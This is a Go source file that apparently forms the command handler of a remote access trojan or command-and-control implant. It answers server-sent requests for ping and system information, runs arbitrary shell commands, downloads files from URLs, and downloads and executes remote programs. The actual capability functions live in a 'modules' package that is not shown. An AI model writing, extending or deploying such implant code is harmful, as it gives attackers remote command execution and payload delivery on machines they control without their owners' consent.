package message

import (
	"../modules"
	"./types"
	"encoding/gob"
	"log"
)

/*
 * HandleMessage() function handles commands sent from the server
 * This function only handles commands with no payload. If a payload
 * needs to be received, use HandleMessageWithPayload
 */
func HandleMessage(messageID byte) (responseID byte, response interface{}) {

        /// Messages with no payload
        /// Ping
        if messageID == types.REQ_PING {
                return types.RES_PING, nil
        }

        /// Basic system info
        if messageID == types.REQ_BASIC_SYSTEM_INFO {
                return types.RES_BASIC_SYSTEM_INFO, modules.GetBasicSystemInfo()
        }

        if messageID == types.REQ_SYSTEM_INFO {
                return types.RES_SYSTEM_INFO, modules.GetSystemInfo()
        }

        // The message wasn't handled for some reason
        return types.ERR_MESSAGE_NOT_HANDLED, nil
}

/*
 * HandleMessageWithPayload() function takes a message ID and
 * A gob decoder which can be used to decode into the neccessary structure
 */
func HandleMessageWithPayload(messageID byte, decoder *gob.Decoder) (responseID byte, response interface{}) {
	if messageID == types.REQ_RUN_COMMAND {
		var req types.RunCommandRequest
		var res types.RunCommandReponse
		err := decoder.Decode(&req)
		if err != nil {
			log.Printf("error decoding: %s", err)
			return types.ERR_GOB, nil
		}
		res.Success, res.Response = modules.RunCommand(req.Command, req.Args, req.Backround)
		return types.RES_RUN_COMMAND, res
	}

	if messageID == types.REQ_DOWNLOAD_FILE {
		var req types.DownloadFileRequest
		var res types.DownloadFileResponse
		err := decoder.Decode(&req)
		if err != nil {
			log.Printf("error decoding: %s", err)
			return types.ERR_GOB, nil
		}
		result := modules.DownloadFile(req.Url, req.Location)
		if result != nil {
				res.Error = result.Error()
		}
		return types.RES_DOWNLOAD_FILE, res
	}

	if messageID == types.REQ_DOWNLOAD_EXECUTE {
		var req types.DownloadAndExecuteRequest
		var res types.DownloadAndExecuteResponse
		err := decoder.Decode(&req)
		if err != nil {
			log.Printf( "error decoding: %s", err)
			return types.ERR_GOB, nil
		}
		result := modules.DownloadAndExecute(req.Url, req.Args)
		if result != nil {
			res.Error = result.Error()
		}
		return types.RES_DOWNLOAD_EXECUTE, res
	}

	return types.ERR_MESSAGE_NOT_HANDLED, nil
}